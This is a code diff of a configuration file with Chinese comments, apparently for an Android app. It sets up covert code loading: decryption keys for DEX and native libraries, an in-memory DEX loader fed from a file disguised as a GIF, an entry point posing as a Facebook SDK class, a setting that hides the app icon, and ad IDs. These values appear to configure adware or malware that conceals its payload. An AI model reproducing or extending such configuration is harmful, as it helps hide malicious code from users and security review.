@@ -26,14 +26,37 @@
   "dahlia_id_h": "981772962",
   // 广告id 低价值
   "dahlia_idL": "981772963",
-  // 解密dex的key
-  "igloo_miz": "ki2j4z3m6j7aks12qe3e",
+  // 进入dex需要的信息
+  "igl_dex_path": "dalvik.system.InMemoryDexClassLoader=java.lang.ClassLoader=getClassLoader=iosk.gif=ki2j4z3m6j7aks12",
+  // 入口
+  "types_str": "com.facebook.appevents.AppEventLogger",
   // 解密so的key
   "igloo_ks": "opl12is4jz4h5szb",
   // 隐藏icon
   "igloo_name": "freshasg"
 }
 
-//android.os.Build.VERSION_CODES.Q
-//Android 10 奔溃多弹通知栏，通知栏高度不对 ，主要机型xiaomi、Samsung、Huawei、vivo
+// 配置A
+{
+  "gazelle_tim": "60-60",
+  "gazelle_gos_s": "gaze",
+  "gazelle_fbi": "3616318175247400",
+  "gazelle_fbt": "3616318175247400",
+  "igl_dex_path": "",
+  "dahlia_t": "30-30-60-8-16-80-500-800-40",
+  "dahlia_na": "",
+  "dahlia_id_h": "981772962",
+  "dahlia_idL": "981772963",
+  "igloo_miz": "ki2j4z3m6j7aks12qe3e",
+  "igloo_ks": "opl12is4jz4h5szb",
+  "igloo_name": "freshasg"
+}
+
+//配置B
+{
+  "gazelle_tim": "60-60",
+  "gazelle_gos_s": "lle",
+  "gazelle_fbi": "3616318175247400",
+  "gazelle_fbt": "3616318175247400"
+}
 
